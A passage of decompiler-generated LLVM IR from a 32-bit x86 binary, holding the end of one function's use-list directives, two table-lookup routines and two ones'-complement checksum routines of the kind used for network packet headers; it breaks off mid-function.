  uselistorder i1* %zf.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 9, 10, 6, 7, 11, 12, 13, 14, 15, 17, 16, 52, 18, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 46, 19, 20, 21, 22, 23, 25, 48, 49, 50, 51, 53, 55, 56, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 73, 72, 45, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 88, 89, 87, 24, 47, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 224, 225, 226, 227, 125, 126, 127, 128, 129, 139, 130, 131, 132, 133, 134, 135, 136, 137, 138, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 212, 214, 213, 208, 209, 210, 211, 215, 216, 217, 218, 219, 220, 221, 222, 223, 242, 243, 244, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 275, 276, 245, 246, 247, 248, 249, 250, 259, 260, 251, 252, 253, 254, 255, 256, 257, 258, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 288, 289, 277, 278, 279, 280, 283, 284, 281, 282, 57, 54, 285, 286, 287, 297, 290, 291, 292, 293, 294, 295, 296, 298, 299, 300 }
  uselistorder i32* %esi.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 15, 16, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 4, 5, 6, 3, 33, 7, 20, 21, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 23, 25, 24, 18, 26, 27, 28, 29, 30, 31, 32, 34, 39, 35, 36, 37, 38, 40, 41, 42, 43, 44, 45, 97, 98, 99, 46, 47, 48, 49, 50, 51, 52, 53, 55, 54, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 173, 174, 175, 176, 177, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 84, 88, 85, 86, 87, 83, 89, 90, 91, 92, 93, 94, 95, 96, 149, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 161, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 162, 163, 164, 165, 166, 167, 168, 170, 169, 22, 171, 172 }
  uselistorder i32* %edi.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 15, 16, 7, 8, 9, 10, 11, 14, 17, 18, 19, 20, 21, 22, 12, 13, 23, 33, 24, 25, 26, 27, 28, 29, 35, 60, 61, 30, 31, 32, 34, 36, 37, 38, 39, 40, 41, 44, 45, 42, 43, 46, 47, 120, 48, 49, 50, 51, 52, 53, 55, 56, 54, 57, 58, 59, 109, 110, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 111, 112, 113, 114, 115, 116, 117, 118, 119 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 29, 30, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 20, 21, 22, 23, 24, 25, 435, 15, 16, 17, 18, 19, 26, 27, 28, 29, 30, 31, 32, 33, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 34, 35, 37, 38, 61, 62, 63, 64, 65, 66, 67, 69, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 106, 105, 36, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 151, 152, 164, 165, 153, 154, 155, 156, 167, 157, 158, 159, 160, 161, 162, 163, 166, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 497, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 201, 200, 202, 203, 204, 205, 206, 207, 494, 495, 496, 498, 499, 500, 501, 502, 503, 508, 509, 504, 505, 506, 507, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 234, 235, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 236, 237, 238, 239, 241, 242, 240, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 262, 263, 267, 268, 264, 265, 266, 260, 261, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 407, 408, 412, 409, 410, 411, 413, 414, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 455, 456, 457, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 430, 431, 428, 429, 432, 433, 434, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 483, 450, 451, 452, 453, 454, 484, 485, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 477, 478, 475, 476, 70, 68, 479, 480, 481, 482, 486, 487, 488, 489, 490, 491, 492, 493 }
  uselistorder i32 147, { 0, 7, 8, 9, 1, 10, 11, 12, 2, 13, 26, 3, 14, 15, 16, 4, 17, 18, 19, 5, 20, 21, 22, 23, 24, 27, 6, 25 }
  uselistorder i32 -1452, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 20740, { 1, 2, 3, 4, 0 }
  uselistorder i32 20612, { 1, 2, 0, 3 }
  uselistorder i32 10388, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49 }
  uselistorder i32 20900, { 4, 5, 6, 7, 8, 0, 3, 2, 9, 10, 11, 12, 1, 13, 14, 15, 16 }
  uselistorder i32 20916, { 2, 0, 15, 3, 4, 10, 8, 14, 13, 1, 16, 7, 17, 11, 5, 12, 6, 9, 18, 19, 20, 21 }
  uselistorder i8 47, { 0, 1, 3, 4, 2, 5, 7, 6 }
  uselistorder i32 3140, { 1, 2, 3, 4, 0 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_8054b54.5 to i32), { 1, 0 }
  uselistorder i32 134564614, { 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_8049f6a, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8049ec7, { 1, 0 }
  uselistorder label %dec_label_pc_8049e86, { 1, 0 }
  uselistorder label %dec_label_pc_8049d1e, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8049ce8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8049bbc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8049b86, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8049b6c, { 1, 0 }
  uselistorder label %dec_label_pc_8049b32, { 1, 0 }
  uselistorder label %dec_label_pc_8049a49, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8049a11, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80499f3, { 1, 0 }
  uselistorder label %dec_label_pc_80499d4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80499c3, { 1, 0 }
  uselistorder label %dec_label_pc_804994e, { 1, 0 }
  uselistorder label %dec_label_pc_8049928, { 1, 0 }
  uselistorder label %dec_label_pc_80498ea, { 1, 0 }
  uselistorder label %dec_label_pc_80497f9, { 1, 0 }
  uselistorder label %dec_label_pc_804974f, { 1, 0 }
  uselistorder label %dec_label_pc_80496c3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80495d1, { 1, 0 }
  uselistorder label %dec_label_pc_804958e, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_8049562, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8049550, { 1, 0 }
  uselistorder label %dec_label_pc_80494dc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804949f, { 0, 1, 5, 2, 3, 4 }
  uselistorder label %dec_label_pc_8049468, { 1, 0 }
  uselistorder label %dec_label_pc_804930a, { 1, 0 }
  uselistorder label %dec_label_pc_8049301, { 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80492e4, { 1, 0 }
  uselistorder label %dec_label_pc_80492b2, { 1, 0 }
  uselistorder label %dec_label_pc_8049289, { 1, 0 }
  uselistorder label %dec_label_pc_804924d, { 1, 0 }
  uselistorder label %dec_label_pc_80491db, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80491b6, { 1, 0 }
  uselistorder label %dec_label_pc_8049124, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80490e1, { 1, 0 }
  uselistorder label %dec_label_pc_8049044, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8049001, { 1, 0 }
  uselistorder label %dec_label_pc_8048f64, { 1, 0 }
  uselistorder label %dec_label_pc_8048f33, { 1, 0 }
  uselistorder label %dec_label_pc_8048ee1, { 1, 0 }
  uselistorder label %dec_label_pc_8048e4a, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8048db9, { 1, 0 }
  uselistorder label %dec_label_pc_8048d91, { 7, 8, 2, 1, 9, 3, 10, 11, 12, 15, 0, 13, 14, 6, 4, 5 }
  uselistorder label %dec_label_pc_8048d58, { 1, 0 }
  uselistorder label %dec_label_pc_8048c28, { 1, 0 }
  uselistorder label %dec_label_pc_8048c10, { 1, 0 }
  uselistorder label %dec_label_pc_8048bb4, { 1, 0 }
  uselistorder label %dec_label_pc_8048ad8, { 1, 0 }
  uselistorder label %dec_label_pc_8048700, { 1, 0 }
  uselistorder label %dec_label_pc_8048601, { 1, 0 }
  uselistorder label %dec_label_pc_80485be, { 1, 0 }
  uselistorder label %dec_label_pc_8048582, { 0, 1, 2, 3, 4, 7, 6, 5, 8 }
  uselistorder label %dec_label_pc_804855f, { 1, 0 }
  uselistorder label %dec_label_pc_80484e5, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_80484e5.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804848a, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_804841e, { 1, 0 }
  uselistorder label %dec_label_pc_80482cc, { 1, 0 }
  uselistorder label %dec_label_pc_80482b8, { 1, 0 }
  uselistorder label %dec_label_pc_804825d, { 1, 2, 0, 3, 4 }
}

define i32 @function_804a0a0(i8 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804a0a0:
  %tmp = trunc i32 %arg3 to i8
  %v4_804a0a5 = urem i32 %arg3, 256
  %v4_804a0b1 = zext i8 %arg1 to i32
  %v2_804a0b5 = icmp eq i8 %arg1, 0
  br i1 %v2_804a0b5, label %dec_label_pc_804a0e3, label %dec_label_pc_804a0c0

dec_label_pc_804a0c0:                             ; preds = %dec_label_pc_804a0a0
  %v3_804a0c4 = add i32 %arg2, 4
  %v4_804a0c4 = inttoptr i32 %v3_804a0c4 to i8*
  %v5_804a0c4 = load i8, i8* %v4_804a0c4, align 1
  %v16_804a0c4 = icmp eq i8 %tmp, %v5_804a0c4
  br i1 %v16_804a0c4, label %dec_label_pc_804a0eb, label %dec_label_pc_804a0c9

dec_label_pc_804a0c9:                             ; preds = %dec_label_pc_804a0c0
  br label %dec_label_pc_804a0de

dec_label_pc_804a0d0:                             ; preds = %dec_label_pc_804a0de
  %v1_804a0d0 = add i32 %v0_804a0d3.in, 12
  %v2_804a0d0 = inttoptr i32 %v1_804a0d0 to i8*
  %v3_804a0d0 = load i8, i8* %v2_804a0d0, align 1
  %v4_804a0d0 = zext i8 %v3_804a0d0 to i32
  %v6_804a0d0 = and i32 %v5_804a0d0, -256
  %v7_804a0d0 = or i32 %v4_804a0d0, %v6_804a0d0
  %v16_804a0d8 = icmp eq i8 %v3_804a0d0, %tmp
  br i1 %v16_804a0d8, label %dec_label_pc_804a0eb, label %dec_label_pc_804a0de

dec_label_pc_804a0de:                             ; preds = %dec_label_pc_804a0d0, %dec_label_pc_804a0c9
  %v5_804a0d0 = phi i32 [ %v7_804a0d0, %dec_label_pc_804a0d0 ], [ %v4_804a0a5, %dec_label_pc_804a0c9 ]
  %v0_804a0d3.in = phi i32 [ %v0_804a0d3, %dec_label_pc_804a0d0 ], [ %arg2, %dec_label_pc_804a0c9 ]
  %v0_804a0de = phi i32 [ %v1_804a0de, %dec_label_pc_804a0d0 ], [ 0, %dec_label_pc_804a0c9 ]
  %v0_804a0d3 = add i32 %v0_804a0d3.in, 8
  %v1_804a0de = add i32 %v0_804a0de, 1
  store i32 %v1_804a0de, i32* @ecx, align 4
  %v12_804a0df = icmp eq i32 %v1_804a0de, %v4_804a0b1
  %v1_804a0e1 = icmp eq i1 %v12_804a0df, false
  br i1 %v1_804a0e1, label %dec_label_pc_804a0d0, label %dec_label_pc_804a0e3

dec_label_pc_804a0e3:                             ; preds = %dec_label_pc_804a0de, %dec_label_pc_804a0a0
  ret i32 %arg4

dec_label_pc_804a0eb:                             ; preds = %dec_label_pc_804a0d0, %dec_label_pc_804a0c0
  %v0_804a0eb = phi i32 [ %arg2, %dec_label_pc_804a0c0 ], [ %v0_804a0d3, %dec_label_pc_804a0d0 ]
  %v1_804a0eb = inttoptr i32 %v0_804a0eb to i32*
  %v2_804a0eb = load i32, i32* %v1_804a0eb, align 4
  ret i32 %v2_804a0eb

; uselistorder directives
  uselistorder i32 %v1_804a0de, { 0, 2, 1 }
  uselistorder i32 %v0_804a0d3.in, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8 %arg1, { 1, 0 }
}

define i32 @function_804a600(i8 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804a600:
  %v0_804a600 = load i32, i32* @edi, align 4
  %v0_804a601 = load i32, i32* @esi, align 4
  %v0_804a602 = load i32, i32* @ebx, align 4
  %v4_804a606 = zext i8 %arg1 to i32
  %v2_804a60e = icmp eq i8 %arg1, 0
  %v4_804a618 = urem i32 %arg3, 256
  %v5_804a618 = load i32, i32* @eax, align 4
  %v6_804a618 = and i32 %v5_804a618, -256
  %v7_804a618 = or i32 %v6_804a618, %v4_804a618
  br i1 %v2_804a60e, label %dec_label_pc_804a645, label %dec_label_pc_804a622

dec_label_pc_804a622:                             ; preds = %dec_label_pc_804a600
  %v1_804a622 = trunc i32 %arg3 to i8
  %v3_804a626 = add i32 %arg2, 4
  %v4_804a626 = inttoptr i32 %v3_804a626 to i8*
  %v5_804a626 = load i8, i8* %v4_804a626, align 1
  %v16_804a626 = icmp eq i8 %v1_804a622, %v5_804a626
  br i1 %v16_804a626, label %dec_label_pc_804a64c, label %dec_label_pc_804a62b

dec_label_pc_804a62b:                             ; preds = %dec_label_pc_804a622
  br label %dec_label_pc_804a640

dec_label_pc_804a632:                             ; preds = %dec_label_pc_804a640
  %v1_804a632 = add i32 %v0_804a635.in, 12
  %v2_804a632 = inttoptr i32 %v1_804a632 to i8*
  %v3_804a632 = load i8, i8* %v2_804a632, align 1
  %v4_804a632 = zext i8 %v3_804a632 to i32
  %v6_804a632 = and i32 %v5_804a632, -256
  %v7_804a632 = or i32 %v4_804a632, %v6_804a632
  %v16_804a63a = icmp eq i8 %v1_804a622, %v3_804a632
  br i1 %v16_804a63a, label %dec_label_pc_804a64c, label %dec_label_pc_804a640

dec_label_pc_804a640:                             ; preds = %dec_label_pc_804a632, %dec_label_pc_804a62b
  %v5_804a632 = phi i32 [ %v7_804a632, %dec_label_pc_804a632 ], [ %v7_804a618, %dec_label_pc_804a62b ]
  %v0_804a635.in = phi i32 [ %v0_804a635, %dec_label_pc_804a632 ], [ %arg2, %dec_label_pc_804a62b ]
  %v0_804a640 = phi i32 [ %v1_804a640, %dec_label_pc_804a632 ], [ 0, %dec_label_pc_804a62b ]
  %v0_804a635 = add i32 %v0_804a635.in, 8
  %v1_804a640 = add i32 %v0_804a640, 1
  store i32 %v1_804a640, i32* @ecx, align 4
  %v12_804a641 = icmp eq i32 %v4_804a606, %v1_804a640
  %v1_804a643 = icmp eq i1 %v12_804a641, false
  br i1 %v1_804a643, label %dec_label_pc_804a632, label %dec_label_pc_804a645

dec_label_pc_804a645:                             ; preds = %dec_label_pc_804a640, %dec_label_pc_804a64c, %dec_label_pc_804a600
  store i32 %v0_804a602, i32* @ebx, align 4
  store i32 %v0_804a601, i32* @esi, align 4
  store i32 %v0_804a600, i32* @edi, align 4
  ret i32 %arg4

dec_label_pc_804a64c:                             ; preds = %dec_label_pc_804a632, %dec_label_pc_804a622
  %v0_804a64c = phi i32 [ %arg2, %dec_label_pc_804a622 ], [ %v0_804a635, %dec_label_pc_804a632 ]
  %v1_804a64c = inttoptr i32 %v0_804a64c to i32*
  %v2_804a64c = load i32, i32* %v1_804a64c, align 4
  %sext = mul i32 %v2_804a64c, 16777216
  %v2_804a64e = icmp eq i32 %sext, 0
  br i1 %v2_804a64e, label %dec_label_pc_804a645, label %dec_label_pc_804a652

dec_label_pc_804a652:                             ; preds = %dec_label_pc_804a64c
  store i32 %v0_804a602, i32* @ebx, align 4
  store i32 %v0_804a601, i32* @esi, align 4
  store i32 %v0_804a600, i32* @edi, align 4
  %v2_804a662 = sdiv i32 %sext, 16777216
  %v3_804a662 = inttoptr i32 %v2_804a662 to i8*
  %v4_804a662 = call i32 @function_8051da0(i8* %v3_804a662, i32 10)
  ret i32 %v4_804a662

; uselistorder directives
  uselistorder i32 %v1_804a640, { 0, 2, 1 }
  uselistorder i32 %v0_804a635.in, { 1, 0 }
  uselistorder i32 %v0_804a602, { 1, 0 }
  uselistorder i32 %v0_804a601, { 1, 0 }
  uselistorder i32 %v0_804a600, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804a645, { 1, 0, 2 }
}

define i32 @function_804d4b0() local_unnamed_addr {
dec_label_pc_804d4b0:
  %tmp = call i16* @__decompiler_undefined_function_4()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %v4_804d4b7 = ptrtoint i16* %tmp to i32
  %tmp14 = or i32 %tmp11, 1
  %tmp15 = icmp eq i32 %tmp14, 1
  br i1 %tmp15, label %dec_label_pc_804d4d5, label %dec_label_pc_804d4c0

dec_label_pc_804d4c0:                             ; preds = %dec_label_pc_804d4b0, %dec_label_pc_804d4c0
  %v0_804d4ce = phi i32 [ %v2_804d4ce, %dec_label_pc_804d4c0 ], [ 0, %dec_label_pc_804d4b0 ]
  %v0_804d4c3 = phi i32 [ %v1_804d4c3, %dec_label_pc_804d4c0 ], [ %tmp11, %dec_label_pc_804d4b0 ]
  %v0_804d4cb = phi i32 [ %v1_804d4cb, %dec_label_pc_804d4c0 ], [ %v4_804d4b7, %dec_label_pc_804d4b0 ]
  %v1_804d4c0 = inttoptr i32 %v0_804d4cb to i16*
  %v2_804d4c0 = load i16, i16* %v1_804d4c0, align 2
  %v3_804d4c0 = zext i16 %v2_804d4c0 to i32
  %v1_804d4c3 = add i32 %v0_804d4c3, -2
  %v1_804d4cb = add i32 %v0_804d4cb, 2
  %v2_804d4ce = add i32 %v3_804d4c0, %v0_804d4ce
  %v5_804d4d0 = icmp eq i32 %v1_804d4c3, 0
  %v9_804d4d0 = icmp eq i32 %v0_804d4c3, 3
  %v2_804d4d3 = or i1 %v9_804d4d0, %v5_804d4d0
  br i1 %v2_804d4d3, label %dec_label_pc_804d4d5.loopexit, label %dec_label_pc_804d4c0

dec_label_pc_804d4d5.loopexit:                    ; preds = %dec_label_pc_804d4c0
  br label %dec_label_pc_804d4d5

dec_label_pc_804d4d5:                             ; preds = %dec_label_pc_804d4d5.loopexit, %dec_label_pc_804d4b0
  %v0_804d4db = phi i32 [ %v2_804d4ce, %dec_label_pc_804d4d5.loopexit ], [ 0, %dec_label_pc_804d4b0 ]
  %v0_804d4d8 = phi i32 [ %v1_804d4cb, %dec_label_pc_804d4d5.loopexit ], [ %v4_804d4b7, %dec_label_pc_804d4b0 ]
  %v0_804d4d5 = phi i32 [ %v1_804d4c3, %dec_label_pc_804d4d5.loopexit ], [ %tmp11, %dec_label_pc_804d4b0 ]
  %v8_804d4d5 = icmp eq i32 %v0_804d4d5, 1
  %v1_804d4d6 = icmp eq i1 %v8_804d4d5, false
  br i1 %v1_804d4d6, label %dec_label_pc_804d4dd, label %dec_label_pc_804d4d8

dec_label_pc_804d4d8:                             ; preds = %dec_label_pc_804d4d5
  %v1_804d4d8 = inttoptr i32 %v0_804d4d8 to i8*
  %v2_804d4d8 = load i8, i8* %v1_804d4d8, align 1
  %v3_804d4d8 = sext i8 %v2_804d4d8 to i32
  %v2_804d4db = add i32 %v3_804d4d8, %v0_804d4db
  br label %dec_label_pc_804d4dd

dec_label_pc_804d4dd:                             ; preds = %dec_label_pc_804d4d5, %dec_label_pc_804d4d8
  %v0_804d4dd = phi i32 [ %v0_804d4db, %dec_label_pc_804d4d5 ], [ %v2_804d4db, %dec_label_pc_804d4d8 ]
  %v1_804d4df = urem i32 %v0_804d4dd, 65536
  %v2_804d4e2 = udiv i32 %v0_804d4dd, 65536
  %v2_804d4e6 = add nuw nsw i32 %v1_804d4df, %v2_804d4e2
  %v2_804d4ea = udiv i32 %v2_804d4e6, 65536
  %v2_804d4ed = add nuw nsw i32 %v2_804d4ea, %v2_804d4e6
  %v1_804d4ef = urem i32 %v2_804d4ed, 65536
  %v1_804d4f2 = xor i32 %v1_804d4ef, 65535
  ret i32 %v1_804d4f2

; uselistorder directives
  uselistorder i32 %v2_804d4e6, { 1, 0 }
  uselistorder i32 %v0_804d4db, { 1, 0 }
  uselistorder i32 %v1_804d4c3, { 0, 2, 1 }
  uselistorder i32 %v4_804d4b7, { 1, 0 }
  uselistorder i32 %tmp11, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d4dd, { 1, 0 }
  uselistorder label %dec_label_pc_804d4c0, { 1, 0 }
}

define i32 @function_804d500() local_unnamed_addr {
dec_label_pc_804d500:
  %tmp14 = call i16* @__decompiler_undefined_function_4()
  %tmp15 = call i16 @__decompiler_undefined_function_1()
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  %tmp17 = call i32 @__decompiler_undefined_function_0()
  %v4_804d515 = ptrtoint i16* %tmp14 to i32
  %v1_804d51e = add i32 %tmp17, 12
  %v2_804d51e = inttoptr i32 %v1_804d51e to i32*
  %v3_804d51e = load i32, i32* %v2_804d51e, align 4
  %v1_804d521 = add i32 %tmp17, 16
  %v2_804d521 = inttoptr i32 %v1_804d521 to i32*
  %v3_804d521 = load i32, i32* %v2_804d521, align 4
  %v7_804d527 = icmp sgt i32 %tmp16, 1
  br i1 %v7_804d527, label %dec_label_pc_804d530, label %dec_label_pc_804d545

dec_label_pc_804d530:                             ; preds = %dec_label_pc_804d500, %dec_label_pc_804d530
  %v0_804d53e = phi i32 [ %v2_804d53e, %dec_label_pc_804d530 ], [ 0, %dec_label_pc_804d500 ]
  %v0_804d533 = phi i32 [ %v1_804d533, %dec_label_pc_804d530 ], [ %tmp16, %dec_label_pc_804d500 ]
  %v0_804d53b = phi i32 [ %v1_804d53b, %dec_label_pc_804d530 ], [ %v4_804d515, %dec_label_pc_804d500 ]
  %v1_804d530 = inttoptr i32 %v0_804d53b to i16*
  %v2_804d530 = load i16, i16* %v1_804d530, align 2
  %v3_804d530 = zext i16 %v2_804d530 to i32
  %v1_804d533 = add i32 %v0_804d533, -2
  %v1_804d53b = add i32 %v0_804d53b, 2
  %v2_804d53e = add i32 %v3_804d530, %v0_804d53e
  %v1_804d540 = add i32 %v0_804d533, -3
  %v6_804d540 = sub i32 2, %v0_804d533
  %v7_804d540 = and i32 %v1_804d533, %v6_804d540
  %v8_804d540 = icmp slt i32 %v7_804d540, 0
  %v9_804d540 = icmp eq i32 %v1_804d540, 0
  %v10_804d540 = icmp slt i32 %v1_804d540, 0
  %v3_804d543 = icmp eq i1 %v10_804d540, %v8_804d540
  %v4_804d543 = icmp eq i1 %v9_804d540, false
  %v5_804d543 = and i1 %v4_804d543, %v3_804d543
  br i1 %v5_804d543, label %dec_label_pc_804d530, label %dec_label_pc_804d545.loopexit

dec_label_pc_804d545.loopexit:                    ; preds = %dec_label_pc_804d530
  br label %dec_label_pc_804d545

dec_label_pc_804d545:                             ; preds = %dec_label_pc_804d545.loopexit, %dec_label_pc_804d500
  %v0_804d5b0 = phi i32 [ %v2_804d53e, %dec_label_pc_804d545.loopexit ], [ 0, %dec_label_pc_804d500 ]
  %v0_804d5ae = phi i32 [ %v1_804d53b, %dec_label_pc_804d545.loopexit ], [ %v4_804d515, %dec_label_pc_804d500 ]
  %v0_804d545 = phi i32 [ %v1_804d533, %dec_label_pc_804d545.loopexit ], [ %tmp16, %dec_label_pc_804d500 ]
  %v8_804d545 = icmp eq i32 %v0_804d545, 1
  br i1 %v8_804d545, label %dec_label_pc_804d5ac, label %dec_label_pc_804d548

dec_label_pc_804d548:                             ; preds = %dec_label_pc_804d545, %dec_label_pc_804d5ac
  %v0_804d556 = phi i32 [ %v0_804d5b0, %dec_label_pc_804d545 ], [ %v2_804d5b0, %dec_label_pc_804d5ac ]
  %v2_804d54c = udiv i32 %v3_804d521, 65536
  %v1_804d54f = add i32 %tmp17, 9
  %v2_804d54f = inttoptr i32 %v1_804d54f to i8*
  %v3_804d54f = load i8, i8* %v2_804d54f, align 1
  %v1_804d552 = zext i8 %v3_804d54f to i16
  %v2_804d552 = call i16 @llvm.bswap.i16(i16 %v1_804d552)
  %v3_804d552 = zext i16 %v2_804d552 to i32
  %v2_804d556 = add i32 %v0_804d556, %v2_804d54c
  %v2_804d55e = add i32 %v2_804d556, %v3_804d552
  %v1_804d564 = urem i32 %v3_804d51e, 65536
  %v2_804d56a = udiv i32 %v3_804d51e, 65536
  %v1_804d571 = urem i32 %v3_804d521, 65536
  %v4_804d579 = zext i16 %tmp15 to i32
  %v2_804d56d = add nuw nsw i32 %v2_804d56a, %v4_804d579
  %v2_804d577 = add nuw nsw i32 %v2_804d56d, %v1_804d564
  %v2_804d584 = add nuw nsw i32 %v2_804d577, %v1_804d571
  %v2_804d586 = add i32 %v2_804d584, %v2_804d55e
  %tmp = icmp ult i32 %v2_804d586, 65536
  br i1 %tmp, label %dec_label_pc_804d59e, label %dec_label_pc_804d590

dec_label_pc_804d590:                             ; preds = %dec_label_pc_804d548, %dec_label_pc_804d590
  %v2_804d5953 = phi i32 [ %v2_804d595, %dec_label_pc_804d590 ], [ %v2_804d586, %dec_label_pc_804d548 ]
  %v2_804d5994.in = phi i32 [ %v2_804d595, %dec_label_pc_804d590 ], [ %v2_804d586, %dec_label_pc_804d548 ]
  %v2_804d5994 = udiv i32 %v2_804d5994.in, 65536
  %v1_804d590 = urem i32 %v2_804d5953, 65536
  %v2_804d595 = add nuw nsw i32 %v1_804d590, %v2_804d5994
  %tmp25 = icmp ult i32 %v2_804d595, 65536
  %v1_804d59c = icmp eq i1 %tmp25, false
  br i1 %v1_804d59c, label %dec_label_pc_804d590, label %dec_label_pc_804d59e.loopexit

dec_label_pc_804d59e.loopexit:                    ; preds = %dec_label_pc_804d590
  br label %dec_label_pc_804d59e

dec_label_pc_804d59e:                             ; preds = %dec_label_pc_804d59e.loopexit, %dec_label_pc_804d548
